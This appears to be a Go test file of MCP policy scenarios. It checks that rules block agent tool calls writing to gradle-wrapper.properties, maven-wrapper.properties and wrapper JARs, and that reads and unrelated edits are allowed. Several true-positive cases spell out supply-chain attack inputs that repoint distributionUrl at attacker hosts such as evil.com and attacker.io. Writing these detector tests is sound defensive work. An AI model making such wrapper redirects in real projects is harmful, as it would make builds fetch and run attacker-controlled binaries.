// MCP test scenarios for build tool wrapper tampering rules (issue #1729).
// Rules: mcp-sc-block-build-wrapper-props, mcp-sc-block-build-wrapper-jar
// Pack: packs/premium/mcp/mcp-supply-chain-premium.yaml

package scenarios

// BuildWrapperScenarios1729 covers TP and TN cases for the build tool wrapper
// tampering rules. These rules block MCP writes to gradle-wrapper.properties,
// maven-wrapper.properties, and the companion wrapper JARs — all of which
// control where the build tool binary is downloaded from on next invocation.
var BuildWrapperScenarios1729 = []Scenario{
	// TP: gradle-wrapper.properties write (distributionUrl redirect)
	{
		ID:               "MCP-TP-1730",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/gradle/wrapper/gradle-wrapper.properties", "content": "distributionUrl=https://evil.com/gradle-8.0-bin.zip"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props: write_file to gradle-wrapper.properties with malicious distributionUrl",
	},
	{
		ID:               "MCP-TP-1731",
		ToolName:         "str_replace_editor",
		Arguments:        map[string]interface{}{"path": "/home/dev/myapp/gradle/wrapper/gradle-wrapper.properties", "new_str": "distributionUrl=https://attacker.io/gradle.zip"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props: str_replace_editor to gradle-wrapper.properties",
	},
	{
		ID:               "MCP-TP-1732",
		ToolName:         "create_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/.mvn/wrapper/maven-wrapper.properties", "content": "distributionUrl=https://evil.com/apache-maven-3.9.0-bin.zip"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props: create_file to maven-wrapper.properties with malicious distributionUrl",
	},
	{
		ID:               "MCP-TP-1733",
		ToolName:         "edit_file",
		Arguments:        map[string]interface{}{"path": "/home/user/repo/.mvn/wrapper/maven-wrapper.properties"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props: edit_file to maven-wrapper.properties",
	},
	// TP: wrapper JAR writes
	{
		ID:               "MCP-TP-1734",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/gradle/wrapper/gradle-wrapper.jar", "content": "PK malicious content"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-jar: write_file to gradle-wrapper.jar with malicious binary content",
	},
	{
		ID:               "MCP-TP-1735",
		ToolName:         "create_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/.mvn/wrapper/maven-wrapper.jar"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-jar: create_file to maven-wrapper.jar",
	},
	{
		ID:               "MCP-TP-1736",
		ToolName:         "str_replace_editor",
		Arguments:        map[string]interface{}{"path": "/home/dev/myapp/gradle/wrapper/gradle-wrapper.jar"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-jar: str_replace_editor to gradle-wrapper.jar",
	},
	// TN: reading wrapper files is safe (no write)
	{
		ID:               "MCP-TN-1730",
		ToolName:         "read_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/gradle/wrapper/gradle-wrapper.properties"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props TN: read_file of gradle-wrapper.properties is not a write (AUDIT, not BLOCK)",
	},
	{
		ID:               "MCP-TN-1731",
		ToolName:         "read_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/.mvn/wrapper/maven-wrapper.properties"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props TN: read_file of maven-wrapper.properties is not a write (AUDIT, not BLOCK)",
	},
	// TN: writing to documentation files mentioning gradle-wrapper is safe
	{
		ID:               "MCP-TN-1732",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/docs/gradle-wrapper-guide.md", "content": "# gradle-wrapper.properties reference\n\nThe distributionUrl field controls which Gradle version is used."},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props TN: write_file to docs about gradle-wrapper.properties should not trigger",
	},
	// TN: writing to build.gradle (not wrapper) is safe
	{
		ID:               "MCP-TN-1733",
		ToolName:         "write_file",
		Arguments:        map[string]interface{}{"path": "/workspace/project/build.gradle.kts", "content": "plugins { kotlin(\"jvm\") version \"1.9.0\" }"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "supply-chain",
		Description:      "mcp-sc-block-build-wrapper-props TN: write_file to build.gradle.kts (not wrapper) should not trigger",
	},
}
